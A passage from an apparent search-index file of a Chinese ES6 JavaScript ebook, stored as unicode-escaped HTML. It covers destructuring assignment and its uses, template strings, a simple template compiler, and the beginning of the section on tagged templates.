<p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>add</code>\u7684\u53c2\u6570\u8868\u9762\u4e0a\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u4f46\u5728\u4f20\u5165\u53c2\u6570\u7684\u90a3\u4e00\u523b\uff0c\u6570\u7ec4\u53c2\u6570\u5c31\u88ab\u89e3\u6784\u6210\u53d8\u91cf<code>x</code>\u548c<code>y</code>\u3002\u5bf9\u4e8e\u51fd\u6570\u5185\u90e8\u7684\u4ee3\u7801\u6765\u8bf4\uff0c\u5b83\u4eec\u80fd\u611f\u53d7\u5230\u7684\u53c2\u6570\u5c31\u662f<code>x</code>\u548c<code>y</code>\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>[[1, 2], [3, 4]].map(([a, b]) =&gt; a + b);\n// [ 3, 7 ]\n</code></pre> <p>\u51fd\u6570\u53c2\u6570\u7684\u89e3\u6784\u4e5f\u53ef\u4ee5\u4f7f\u7528\u9ed8\u8ba4\u503c\u3002</p> <pre><code>function move({x = 0, y = 0} = {}) {\n  return [x, y];\n}\n\nmove({x: 3, y: 8}); // [3, 8]\nmove({x: 3}); // [3, 0]\nmove({}); // [0, 0]\nmove(); // [0, 0]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>move</code>\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u901a\u8fc7\u5bf9\u8fd9\u4e2a\u5bf9\u8c61\u8fdb\u884c\u89e3\u6784\uff0c\u5f97\u5230\u53d8\u91cf<code>x</code>\u548c<code>y</code>\u7684\u503c\u3002\u5982\u679c\u89e3\u6784\u5931\u8d25\uff0c<code>x</code>\u548c<code>y</code>\u7b49\u4e8e\u9ed8\u8ba4\u503c\u3002</p> <p>\u6ce8\u610f\uff0c\u4e0b\u9762\u7684\u5199\u6cd5\u4f1a\u5f97\u5230\u4e0d\u4e00\u6837\u7684\u7ed3\u679c\u3002</p> <pre><code>function move({x, y} = { x: 0, y: 0 }) {\n  return [x, y];\n}\n\nmove({x: 3, y: 8}); // [3, 8]\nmove({x: 3}); // [3, undefined]\nmove({}); // [undefined, undefined]\nmove(); // [0, 0]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u662f\u4e3a\u51fd\u6570<code>move</code>\u7684\u53c2\u6570\u6307\u5b9a\u9ed8\u8ba4\u503c\uff0c\u800c\u4e0d\u662f\u4e3a\u53d8\u91cf<code>x</code>\u548c<code>y</code>\u6307\u5b9a\u9ed8\u8ba4\u503c\uff0c\u6240\u4ee5\u4f1a\u5f97\u5230\u4e0e\u524d\u4e00\u79cd\u5199\u6cd5\u4e0d\u540c\u7684\u7ed3\u679c\u3002</p> <p><code>undefined</code>\u5c31\u4f1a\u89e6\u53d1\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u3002</p> <pre><code>[1, undefined, 3].map((x = 'yes') =&gt; x);\n// [ 1, 'yes', 3 ]\n</code></pre>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_12","title":"\u5706\u62ec\u53f7\u95ee\u9898","text":"<p>\u89e3\u6784\u8d4b\u503c\u867d\u7136\u5f88\u65b9\u4fbf\uff0c\u4f46\u662f\u89e3\u6790\u8d77\u6765\u5e76\u4e0d\u5bb9\u6613\u3002\u5bf9\u4e8e\u7f16\u8bd1\u5668\u6765\u8bf4\uff0c\u4e00\u4e2a\u5f0f\u5b50\u5230\u5e95\u662f\u6a21\u5f0f\uff0c\u8fd8\u662f\u8868\u8fbe\u5f0f\uff0c\u6ca1\u6709\u529e\u6cd5\u4ece\u4e00\u5f00\u59cb\u5c31\u77e5\u9053\uff0c\u5fc5\u987b\u89e3\u6790\u5230\uff08\u6216\u89e3\u6790\u4e0d\u5230\uff09\u7b49\u53f7\u624d\u80fd\u77e5\u9053\u3002</p> <p>\u7531\u6b64\u5e26\u6765\u7684\u95ee\u9898\u662f\uff0c\u5982\u679c\u6a21\u5f0f\u4e2d\u51fa\u73b0\u5706\u62ec\u53f7\u600e\u4e48\u5904\u7406\u3002ES6 \u7684\u89c4\u5219\u662f\uff0c\u53ea\u8981\u6709\u53ef\u80fd\u5bfc\u81f4\u89e3\u6784\u7684\u6b67\u4e49\uff0c\u5c31\u4e0d\u5f97\u4f7f\u7528\u5706\u62ec\u53f7\u3002\u4f46\u662f\uff0c\u8fd9\u6761\u89c4\u5219\u5b9e\u9645\u4e0a\u4e0d\u90a3\u4e48\u5bb9\u6613\u8fa8\u522b\uff0c\u5904\u7406\u8d77\u6765\u76f8\u5f53\u9ebb\u70e6\u3002\u56e0\u6b64\uff0c\u5efa\u8bae\u53ea\u8981\u6709\u53ef\u80fd\uff0c\u5c31\u4e0d\u8981\u5728\u6a21\u5f0f\u4e2d\u653e\u7f6e\u5706\u62ec\u53f7\u3002</p> <ul> <li>\u4e0d\u80fd\u4f7f\u7528\u5706\u62ec\u53f7\u7684\u60c5\u51b5</li> </ul> <p>\u4ee5\u4e0b\u4e09\u79cd\u89e3\u6784\u8d4b\u503c\u4e0d\u5f97\u4f7f\u7528\u5706\u62ec\u53f7\u3002</p> <p>\uff081\uff09\u53d8\u91cf\u58f0\u660e\u8bed\u53e5</p> <pre><code>// \u5168\u90e8\u62a5\u9519\nlet [(a)] = [1];\n\nlet {x: (c)} = {};\nlet ({x: c}) = {};\nlet {(x: c)} = {};\nlet {(x): c} = {};\n\nlet { o: ({ p: p }) } = { o: { p: 2 } };\n</code></pre> <p>\u4e0a\u9762 6 \u4e2a\u8bed\u53e5\u90fd\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5b83\u4eec\u90fd\u662f\u53d8\u91cf\u58f0\u660e\u8bed\u53e5\uff0c\u6a21\u5f0f\u4e0d\u80fd\u4f7f\u7528\u5706\u62ec\u53f7\u3002</p> <p>\uff082\uff09\u51fd\u6570\u53c2\u6570</p> <p>\u51fd\u6570\u53c2\u6570\u4e5f\u5c5e\u4e8e\u53d8\u91cf\u58f0\u660e\uff0c\u56e0\u6b64\u4e0d\u80fd\u5e26\u6709\u5706\u62ec\u53f7\u3002</p> <pre><code>// \u62a5\u9519\nfunction f([(z)]) { return z; }\n// \u62a5\u9519\nfunction f([z,(x)]) { return x; }\n</code></pre> <p>\uff083\uff09\u8d4b\u503c\u8bed\u53e5\u7684\u6a21\u5f0f</p> <pre><code>// \u5168\u90e8\u62a5\u9519\n({ p: a }) = { p: 42 };\n([a]) = [5];\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5c06\u6574\u4e2a\u6a21\u5f0f\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u5bfc\u81f4\u62a5\u9519\u3002</p> <pre><code>// \u62a5\u9519\n[({ p: a }), { x: c }] = [{}, {}];\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5c06\u4e00\u90e8\u5206\u6a21\u5f0f\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u5bfc\u81f4\u62a5\u9519\u3002</p> <ul> <li>\u53ef\u4ee5\u4f7f\u7528\u5706\u62ec\u53f7\u7684\u60c5\u51b5</li> </ul> <p>\u53ef\u4ee5\u4f7f\u7528\u5706\u62ec\u53f7\u7684\u60c5\u51b5\u53ea\u6709\u4e00\u79cd\uff1a\u8d4b\u503c\u8bed\u53e5\u7684\u975e\u6a21\u5f0f\u90e8\u5206\uff0c\u53ef\u4ee5\u4f7f\u7528\u5706\u62ec\u53f7\u3002</p> <pre><code>[(b)] = [3]; // \u6b63\u786e\n({ p: (d) } = {}); // \u6b63\u786e\n[(parseInt.prop)] = [3]; // \u6b63\u786e\n</code></pre> <p>\u4e0a\u9762\u4e09\u884c\u8bed\u53e5\u90fd\u53ef\u4ee5\u6b63\u786e\u6267\u884c\uff0c\u56e0\u4e3a\u9996\u5148\u5b83\u4eec\u90fd\u662f\u8d4b\u503c\u8bed\u53e5\uff0c\u800c\u4e0d\u662f\u58f0\u660e\u8bed\u53e5\uff1b\u5176\u6b21\u5b83\u4eec\u7684\u5706\u62ec\u53f7\u90fd\u4e0d\u5c5e\u4e8e\u6a21\u5f0f\u7684\u4e00\u90e8\u5206\u3002\u7b2c\u4e00\u884c\u8bed\u53e5\u4e2d\uff0c\u6a21\u5f0f\u662f\u53d6\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\uff0c\u8ddf\u5706\u62ec\u53f7\u65e0\u5173\uff1b\u7b2c\u4e8c\u884c\u8bed\u53e5\u4e2d\uff0c\u6a21\u5f0f\u662f<code>p</code>\uff0c\u800c\u4e0d\u662f<code>d</code>\uff1b\u7b2c\u4e09\u884c\u8bed\u53e5\u4e0e\u7b2c\u4e00\u884c\u8bed\u53e5\u7684\u6027\u8d28\u4e00\u81f4\u3002</p>"},{"location":"ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/#_13","title":"\u7528\u9014","text":"<p>\u53d8\u91cf\u7684\u89e3\u6784\u8d4b\u503c\u7528\u9014\u5f88\u591a\u3002</p> <p>\uff081\uff09\u4ea4\u6362\u53d8\u91cf\u7684\u503c</p> <pre><code>let x = 1, y = 2;\n[x, y] = [y, x];\n</code></pre> <p>\uff082\uff09\u4ece\u51fd\u6570\u8fd4\u56de\u591a\u4e2a\u503c</p> <p>\u51fd\u6570\u53ea\u80fd\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u5982\u679c\u8981\u8fd4\u56de\u591a\u4e2a\u503c\uff0c\u53ea\u80fd\u5c06\u5b83\u4eec\u653e\u5728\u6570\u7ec4\u6216\u5bf9\u8c61\u91cc\u8fd4\u56de\u3002\u6709\u4e86\u89e3\u6784\u8d4b\u503c\uff0c\u53d6\u51fa\u8fd9\u4e9b\u503c\u5c31\u975e\u5e38\u65b9\u4fbf\u3002</p> <pre><code>function example() {\n  return [1, 2, 3];\n}\nlet [a, b, c] = example();\n\nfunction example() {\n  return { foo: 1, bar: 2 };\n}\nlet { foo, bar } = example();\n</code></pre> <p>\uff083\uff09\u51fd\u6570\u53c2\u6570\u7684\u5b9a\u4e49</p> <p>\u89e3\u6784\u8d4b\u503c\u53ef\u4ee5\u65b9\u4fbf\u5730\u5c06\u4e00\u7ec4\u53c2\u6570\u4e0e\u53d8\u91cf\u540d\u5bf9\u5e94\u8d77\u6765\u3002</p> <pre><code>// \u53c2\u6570\u662f\u4e00\u7ec4\u6709\u6b21\u5e8f\u7684\u503c\nfunction f([x, y, z]) { ... }\nf([1, 2, 3]);\n\n// \u53c2\u6570\u662f\u4e00\u7ec4\u65e0\u6b21\u5e8f\u7684\u503c\nfunction f({x, y, z}) { ... }\nf({z: 3, y: 2, x: 1});\n</code></pre> <p>\uff084\uff09\u63d0\u53d6 JSON \u6570\u636e</p> <p>\u89e3\u6784\u8d4b\u503c\u5bf9\u63d0\u53d6 JSON \u5bf9\u8c61\u4e2d\u7684\u6570\u636e\uff0c\u5c24\u5176\u6709\u7528\u3002</p> <pre><code>let jsonData = {\n  id: 42,\n  status: \"OK\",\n  data: [867, 5309]\n};\n\nlet { id, status, data: number } = jsonData;\n</code></pre> <p>\uff085\uff09\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c</p> <pre><code>jQuery.ajax = function (url, {\n  async = true,\n  beforeSend = function () {},\n  cache = true,\n  complete = function () {},\n  crossDomain = false,\n  global = true,\n  // ... more config\n} = {}) {\n  // ... do stuff\n};\n</code></pre> <p>\u6307\u5b9a\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\uff0c\u5c31\u907f\u514d\u4e86\u5728\u51fd\u6570\u4f53\u5185\u90e8\u518d\u5199<code>var foo = config.foo || 'default foo';</code>\u8fd9\u6837\u7684\u8bed\u53e5\u3002</p> <p>\uff086\uff09\u904d\u5386 Map \u7ed3\u6784</p> <p>\u4efb\u4f55\u90e8\u7f72\u4e86 Iterator \u63a5\u53e3\u7684\u5bf9\u8c61\uff0c\u90fd\u53ef\u4ee5\u7528<code>for...of</code>\u5faa\u73af\u904d\u5386\u3002Map \u7ed3\u6784\u539f\u751f\u652f\u6301 Iterator \u63a5\u53e3\uff0c\u914d\u5408\u53d8\u91cf\u7684\u89e3\u6784\u8d4b\u503c\uff0c\u83b7\u53d6\u952e\u540d\u548c\u952e\u503c\u5c31\u975e\u5e38\u65b9\u4fbf\u3002</p> <pre><code>const map = new Map();\nmap.set('first', 'hello');\nmap.set('second', 'world');\n\nfor (let [key, value] of map) {\n  console.log(key + \" is \" + value);\n}\n// first is hello\n// second is world\n</code></pre> <p>\u5982\u679c\u53ea\u60f3\u83b7\u53d6\u952e\u540d\uff0c\u6216\u8005\u53ea\u60f3\u83b7\u53d6\u952e\u503c\uff0c\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>// \u83b7\u53d6\u952e\u540d\nfor (let [key] of map) {\n  // ...\n}\n// \u83b7\u53d6\u952e\u503c\nfor (let [,value] of map) {\n  // ...\n}\n</code></pre> <p>\uff087\uff09\u8f93\u5165\u6a21\u5757\u7684\u6307\u5b9a\u65b9\u6cd5</p> <p>\u52a0\u8f7d\u6a21\u5757\u65f6\uff0c\u5f80\u5f80\u9700\u8981\u6307\u5b9a\u8f93\u5165\u54ea\u4e9b\u65b9\u6cd5\u3002\u89e3\u6784\u8d4b\u503c\u4f7f\u5f97\u8f93\u5165\u8bed\u53e5\u975e\u5e38\u6e05\u6670\u3002</p> <pre><code>const { SourceMapConsumer, SourceNode } = require(\"source-map\");\n</code></pre>"},{"location":"ebook-JSES6-RYF/04-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/","title":"\u5b57\u7b26\u4e32\u6269\u5c55","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 16791  \u9605\u8bfb34\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/04-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/#_2","title":"\u6a21\u677f\u5b57\u7b26\u4e32","text":"<p>ES6 \u5f15\u5165\u4e86\u6a21\u677f\u5b57\u7b26\u4e32\u89e3\u51b3\u4e86\u5b57\u7b26\u4e32\u62fc\u63a5\u3002\u6a21\u677f\u5b57\u7b26\u4e32\u662f\u589e\u5f3a\u7248\u7684\u5b57\u7b26\u4e32\uff0c\u7528\u53cd\u5f15\u53f7\uff08`\uff09\u6807\u8bc6\u3002\u5b83\u53ef\u4ee5\u5f53\u4f5c\u666e\u901a\u5b57\u7b26\u4e32\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u5b9a\u4e49\u591a\u884c\u5b57\u7b26\u4e32\uff0c\u6216\u8005\u5728\u5b57\u7b26\u4e32\u4e2d\u5d4c\u5165\u53d8\u91cf\u3002</p> <pre><code>// \u666e\u901a\u5b57\u7b26\u4e32\n`In JavaScript '\\n' is a line-feed.`\n\n// \u591a\u884c\u5b57\u7b26\u4e32\n`In JavaScript this is\n not legal.`\n\nconsole.log(`string text line 1\nstring text line 2`);\n\n// \u6a21\u677f\u5b57\u7b26\u4e32\u4e2d\u5d4c\u5165\u53d8\u91cf\uff0c\u9700\u8981\u5c06\u53d8\u91cf\u540d\u5199\u5728${}\u4e4b\u4e2d\u3002\nlet name = \"Bob\", time = \"today\";\nlet str = `Hello ${name}, how are you ${time}?`;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u6a21\u677f\u5b57\u7b26\u4e32\uff0c\u90fd\u662f\u7528\u53cd\u5f15\u53f7\u8868\u793a\u3002\u5982\u679c\u5728\u6a21\u677f\u5b57\u7b26\u4e32\u4e2d\u9700\u8981\u4f7f\u7528\u53cd\u5f15\u53f7\uff0c\u5219\u524d\u9762\u8981\u7528\u53cd\u659c\u6760\u8f6c\u4e49\u3002</p> <pre><code>let greeting = `\\`Yo\\` World!`;\n</code></pre> <p>\u5982\u679c\u4f7f\u7528\u6a21\u677f\u5b57\u7b26\u4e32\u8868\u793a\u591a\u884c\u5b57\u7b26\u4e32\uff0c\u6240\u6709\u7684\u7a7a\u683c\u548c\u7f29\u8fdb\u90fd\u4f1a\u88ab\u4fdd\u7559\u5728\u8f93\u51fa\u4e4b\u4e2d\u3002</p> <pre><code>$('#list').html(`\n&lt;ul&gt;\n  &lt;li&gt;first&lt;/li&gt;\n  &lt;li&gt;second&lt;/li&gt;\n&lt;/ul&gt;\n`);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6240\u6709\u6a21\u677f\u5b57\u7b26\u4e32\u7684\u7a7a\u683c\u548c\u6362\u884c\uff0c\u90fd\u662f\u88ab\u4fdd\u7559\u7684\uff0c\u6bd4\u5982<code>&lt;ul&gt;</code>\u6807\u7b7e\u524d\u9762\u4f1a\u6709\u4e00\u4e2a\u6362\u884c\u3002\u5982\u679c\u4f60\u4e0d\u60f3\u8981\u8fd9\u4e2a\u6362\u884c\uff0c\u53ef\u4ee5\u4f7f\u7528<code>trim</code>\u65b9\u6cd5\u6d88\u9664\u5b83\u3002</p> <pre><code>$('#list').html(`\n&lt;ul&gt;\n  &lt;li&gt;first&lt;/li&gt;\n  &lt;li&gt;second&lt;/li&gt;\n&lt;/ul&gt;\n`.trim());\n</code></pre> <p>\u5927\u62ec\u53f7\u5185\u90e8\u53ef\u4ee5\u653e\u5165\u4efb\u610f\u7684 JavaScript \u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u8fdb\u884c\u8fd0\u7b97\uff0c\u4ee5\u53ca\u5f15\u7528\u5bf9\u8c61\u5c5e\u6027\u3002</p> <pre><code>let x = 1;\nlet y = 2;\n\n`${x} + ${y} = ${x + y}`\n// \"1 + 2 = 3\"\n\n`${x} + ${y * 2} = ${x + y * 2}`\n// \"1 + 4 = 5\"\n\nlet obj = {x: 1, y: 2};\n`${obj.x + obj.y}`\n// \"3\"\n</code></pre> <p>\u6a21\u677f\u5b57\u7b26\u4e32\u4e4b\u4e2d\u8fd8\u80fd\u8c03\u7528\u51fd\u6570\u3002</p> <pre><code>function fn() {\n  return \"Hello World\";\n}\n\n`foo ${fn()} bar`\n// foo Hello World bar\n</code></pre> <p>\u5982\u679c\u5927\u62ec\u53f7\u4e2d\u7684\u503c\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u5c06\u6309\u7167\u4e00\u822c\u7684\u89c4\u5219\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002\u6bd4\u5982\uff0c\u5927\u62ec\u53f7\u4e2d\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c06\u9ed8\u8ba4\u8c03\u7528\u5bf9\u8c61\u7684<code>toString</code>\u65b9\u6cd5\u3002</p> <p>\u7531\u4e8e\u6a21\u677f\u5b57\u7b26\u4e32\u7684\u5927\u62ec\u53f7\u5185\u90e8\uff0c\u5c31\u662f\u6267\u884c JavaScript \u4ee3\u7801\uff0c\u56e0\u6b64\u5982\u679c\u5927\u62ec\u53f7\u5185\u90e8\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5c06\u4f1a\u539f\u6837\u8f93\u51fa\u3002</p> <pre><code>`Hello ${'World'}`\n// \"Hello World\"\n</code></pre> <p>\u6a21\u677f\u5b57\u7b26\u4e32\u8fd8\u80fd\u5d4c\u5957\u3002</p> <pre><code>const tmpl = addrs =&gt; `\n  &lt;table&gt;\n  ${addrs.map(addr =&gt; `\n    &lt;tr&gt;&lt;td&gt;${addr.first}&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;&lt;td&gt;${addr.last}&lt;/td&gt;&lt;/tr&gt;\n  `).join('')}\n  &lt;/table&gt;\n`;\n</code></pre> <p>\u5982\u679c\u9700\u8981\u5f15\u7528\u6a21\u677f\u5b57\u7b26\u4e32\u672c\u8eab\uff0c\u5728\u9700\u8981\u65f6\u6267\u884c\uff0c\u53ef\u4ee5\u5199\u6210\u51fd\u6570\u3002</p> <pre><code>let func = (name) =&gt; `Hello ${name}!`;\nfunc('Jack') // \"Hello Jack!\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6a21\u677f\u5b57\u7b26\u4e32\u5199\u6210\u4e86\u4e00\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002\u6267\u884c\u8fd9\u4e2a\u51fd\u6570\uff0c\u5c31\u76f8\u5f53\u4e8e\u6267\u884c\u8fd9\u4e2a\u6a21\u677f\u5b57\u7b26\u4e32\u4e86\u3002</p>"},{"location":"ebook-JSES6-RYF/04-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/#_3","title":"\u6848\u4f8b\uff1a\u6a21\u677f\u7f16\u8bd1","text":"<p>\u4e0b\u9762\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u901a\u8fc7\u6a21\u677f\u5b57\u7b26\u4e32\uff0c\u751f\u6210\u6b63\u5f0f\u6a21\u677f\u7684\u5b9e\u4f8b\u3002</p> <pre><code>let template = `\n&lt;ul&gt;\n  &lt;% for(let i=0; i &lt; data.supplies.length; i++) { %&gt;\n    &lt;li&gt;&lt;%= data.supplies[i] %&gt;&lt;/li&gt;\n  &lt;% } %&gt;\n&lt;/ul&gt;\n`;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5728\u6a21\u677f\u5b57\u7b26\u4e32\u4e4b\u4e2d\uff0c\u653e\u7f6e\u4e86\u4e00\u4e2a\u5e38\u89c4\u6a21\u677f\u3002\u8be5\u6a21\u677f\u4f7f\u7528<code>&lt;%...%&gt;</code>\u653e\u7f6e JavaScript \u4ee3\u7801\uff0c\u4f7f\u7528<code>&lt;%= ... %&gt;</code>\u8f93\u51fa JavaScript \u8868\u8fbe\u5f0f\u3002</p> <p>\u600e\u4e48\u7f16\u8bd1\u8fd9\u4e2a\u6a21\u677f\u5b57\u7b26\u4e32\u5462\uff1f</p> <p>\u4e00\u79cd\u601d\u8def\u662f\u5c06\u5176\u8f6c\u6362\u4e3a JavaScript \u8868\u8fbe\u5f0f\u5b57\u7b26\u4e32\u3002</p> <pre><code>echo('&lt;ul&gt;');\nfor(let i=0; i &lt; data.supplies.length; i++) {\n  echo('&lt;li&gt;');\n  echo(data.supplies[i]);\n  echo('&lt;/li&gt;');\n};\necho('&lt;/ul&gt;');\n</code></pre> <p>\u8fd9\u4e2a\u8f6c\u6362\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5c31\u884c\u4e86\u3002</p> <pre><code>let evalExpr = /&lt;%=(.+?)%&gt;/g;\nlet expr = /&lt;%([\\s\\S]+?)%&gt;/g;\n\ntemplate = template.replace(evalExpr, '`); \\n  echo( $1 ); \\n  echo(`').replace(expr, '`); \\n $1 \\n  echo(`');\ntemplate = 'echo(`' + template + '`);';\n</code></pre> <p>\u7136\u540e\uff0c\u5c06<code>template</code>\u5c01\u88c5\u5728\u4e00\u4e2a\u51fd\u6570\u91cc\u9762\u8fd4\u56de\uff0c\u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>let script =\n`(function parse(data){\n  let output = \"\";\n\n  function echo(html){\n    output += html;\n  }\n\n  ${ template }\n\n  return output;\n})`;\n\nreturn script;\n</code></pre> <p>\u5c06\u4e0a\u9762\u7684\u5185\u5bb9\u62fc\u88c5\u6210\u4e00\u4e2a\u6a21\u677f\u7f16\u8bd1\u51fd\u6570<code>compile</code>\u3002</p> <pre><code>function compile(template){\n  const evalExpr = /&lt;%=(.+?)%&gt;/g;\n  const expr = /&lt;%([\\s\\S]+?)%&gt;/g;\n\n  template = template\n    .replace(evalExpr, '`); \\n  echo( $1 ); \\n  echo(`')\n    .replace(expr, '`); \\n $1 \\n  echo(`');\n\n  template = 'echo(`' + template + '`);';\n\n  let script =\n  `(function parse(data){\n    let output = \"\";\n\n    function echo(html){\n      output += html;\n    }\n\n    ${ template }\n\n    return output;\n  })`;\n\n  return script;\n}\n</code></pre> <p><code>compile</code>\u51fd\u6570\u7684\u7528\u6cd5\u5982\u4e0b\u3002</p> <pre><code>let parse = eval(compile(template));\ndiv.innerHTML = parse({ supplies: [ \"broom\", \"mop\", \"cleaner\" ] });\n//   &lt;ul&gt;\n//     &lt;li&gt;broom&lt;/li&gt;\n//     &lt;li&gt;mop&lt;/li&gt;\n//     &lt;li&gt;cleaner&lt;/li&gt;\n//   &lt;/ul&gt;\n</code></pre>"},{"location":"ebook-JSES6-RYF/04-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/#_4","title":"\u6807\u7b7e\u6a21\u677f","text":"<p>\u6a21\u677f\u5b57\u7b26\u4e32\u7684\u529f\u80fd\uff0c\u4e0d\u4ec5\u4ec5\u662f\u4e0a\u9762\u8fd9\u4e9b\u3002\u5b83\u53ef\u4ee5\u7d27\u8ddf\u5728\u4e00\u4e2a\u51fd\u6570\u540d\u540e\u9762\uff0c\u8be5\u51fd\u6570\u5c06\u88ab\u8c03\u7528\u6765\u5904\u7406\u8fd9\u4e2a\u6a21\u677f\u5b57\u7b26\u4e32\u3002\u8fd9\u88ab\u79f0\u4e3a\u201c\u6807\u7b7e\u6a21\u677f\u201d\u529f\u80fd\uff08tagged template\uff09\u3002</p> <pre><code>alert`123`\n// \u7b49\u540c\u4e8e\nalert(123)\n</code></pre> <p>\u6807\u7b7e\u6a21\u677f\u5176\u5b9e\u4e0d\u662f\u6a21\u677f\uff0c\u800c\u662f\u51fd\u6570\u8c03\u7528\u7684\u4e00\u79cd\u7279\u6b8a\u5f62\u5f0f\u3002\u201c\u6807\u7b7e\u201d\u6307\u7684\u5c31\u662f\u51fd\u6570\uff0c\u7d27\u8ddf\u5728\u540e\u9762\u7684\u6a21\u677f\u5b57\u7b26\u4e32\u5c31\u662f\u5b83\u7684\u53c2\u6570\u3002</p> <p>\u4f46\u662f\uff0c\u5982\u679c\u6a21\u677f\u5b57\u7b26\u91cc\u9762\u6709\u53d8\u91cf\uff0c\u5c31\u4e0d\u662f\u7b80\u5355\u7684\u8c03\u7528\u4e86\uff0c\u800c\u662f\u4f1a\u5c06\u6a21\u677f\u5b57\u7b26\u4e32\u5148\u5904\u7406\u6210\u591a\u4e2a\u53c2\u6570\uff0c\u518d\u8c03\u7528\u51fd\u6570\u3002</p> <pre><code>let a = 5;\nlet b = 10;\n\ntag`Hello ${ a + b } world ${ a * b }`;\n// \u7b49\u540c\u4e8e\ntag(['Hello ', ' world ', ''], 15, 50);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6a21\u677f\u5b57\u7b26\u4e32\u524d\u9762\u6709\u4e00\u4e2a\u6807\u8bc6\u540d<code>tag</code>\uff0c\u5b83\u662f\u4e00\u4e2a\u51fd\u6570\u3002\u6574\u4e2a\u8868\u8fbe\u5f0f\u7684\u8fd4\u56de\u503c\uff0c\u5c31\u662f<code>tag</code>\u51fd\u6570\u5904\u7406\u6a21\u677f\u5b57\u7b26\u4e32\u540e\u7684\u8fd4\u56de\u503c\u3002</p> <p>\u51fd\u6570<code>tag</code>\u4f9d\u6b21\u4f1a\u63a5\u6536\u5230\u591a\u4e2a\u53c2\u6570\u3002</p> <pre><code>function tag(stringArr, value1, value2){\n  // ...\n}\n\n// \u7b49\u540c\u4e8e\n\nfunction tag(stringArr, ...values){\n  // ...\n}\n</code></pre> <p><code>tag</code>\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u8be5\u6570\u7ec4\u7684\u6210\u5458\u662f\u6a21\u677f\u5b57\u7b26\u4e32\u4e2d\u90a3\u4e9b\u6ca1\u6709\u53d8\u91cf\u66ff\u6362\u7684\u90e8\u5206\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53d8\u91cf\u66ff\u6362\u53ea\u53d1\u751f\u5728\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\u4e0e\u7b2c\u4e8c\u4e2a\u6210\u5458\u4e4b\u95f4\u3001\u7b2c\u4e8c\u4e2a\u6210\u5458\u4e0e\u7b2c\u4e09\u4e2a\u6210\u5458\u4e4b\u95f4\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002</p> <p><code>tag</code>\u51fd\u6570\u7684\u5176\u4ed6\u53c2\u6570\uff0c\u90fd\u662f\u6a21\u677f\u5b57\u7b26\u4e32\u5404\u4e2a\u53d8\u91cf\u88ab\u66ff\u6362\u540e\u7684\u503c\u3002\u7531\u4e8e\u672c\u4f8b\u4e2d\uff0c\u6a21\u677f\u5b57\u7b26\u4e32\u542b\u6709\u4e24\u4e2a\u53d8\u91cf\uff0c\u56e0\u6b64<code>tag</code>\u4f1a\u63a5\u53d7\u5230<code>value1</code>\u548c<code>value2</code>\u4e24\u4e2a\u53c2\u6570\u3002</p> <p><code>tag</code>\u51fd\u6570\u6240\u6709\u53c2\u6570\u7684\u5b9e\u9645\u503c\u5982\u4e0b\u3002</p> <ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a<code>['Hello ', ' world ', '']</code></li> <li>\u7b2c\u4e8c\u4e2a\u53c2\u6570: 15</li> <li>\u7b2c\u4e09\u4e2a\u53c2\u6570\uff1a50</li> </ul> 